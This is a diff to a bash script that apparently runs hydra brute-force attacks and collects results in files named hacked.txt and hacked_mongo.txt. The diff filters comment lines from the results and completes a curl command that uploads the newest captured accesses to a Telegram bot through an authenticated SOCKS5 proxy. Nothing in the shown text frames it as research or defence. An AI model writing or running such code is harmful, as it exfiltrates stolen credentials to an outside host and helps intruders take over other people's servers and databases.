@@ -1,5 +1,7 @@
 #!/bin/bash
 
+cd /opt/scan &
+
 tgkey=""
 chat_id=""
 proxy_ip=""
@@ -89,11 +91,11 @@ mv -f hacked_mongo.txt hacked_mongo.txt_`date +%s`
 mv -f hacked.txt hacked.txt_`date +%s`
 
 
-tail ./hacked.txt > ./new_access.txt
+grep -v "#" hacked.txt | tail > ./new_access.txt
 
 if ! ps -aux | grep hydra  | grep -v "grep" | awk {'print $2'}
 
-	then curl -v --socks5 $proxy_ip:$proxy_port -U $proxy_login:$proxy_pass -s --max-time 10 --retry 5 --retry-delay 2 --retry-max-time 10 https://api.telegram.org/bot$tgkey/sendDocument -F documen$
+	then curl -v --socks5 $proxy_ip:$proxy_port -U $proxy_login:$proxy_pass -s --max-time 10 --retry 5 --retry-delay 2 --retry-max-time 10 https://api.telegram.org/bot$tgkey/sendDocument -F document=@new_access.txt -F "chat_id=$chat_id"
 
 fi
 
